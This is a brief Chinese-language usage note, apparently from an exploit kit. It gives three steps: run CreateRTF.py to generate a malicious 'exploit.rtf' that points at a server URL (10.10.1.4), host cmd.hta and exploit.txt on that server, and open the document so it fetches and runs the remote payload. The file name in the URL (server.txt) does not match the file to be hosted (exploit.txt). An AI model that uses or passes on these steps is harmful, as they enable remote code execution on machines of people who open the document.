﻿1、使用 CreateRTF.py -f exploit.rtf -u http://10.10.1.4/server.txt 命令创建攻击文档
2、将 cmd.hta 和 exploit.txt 文件放入服务器
3、打开文档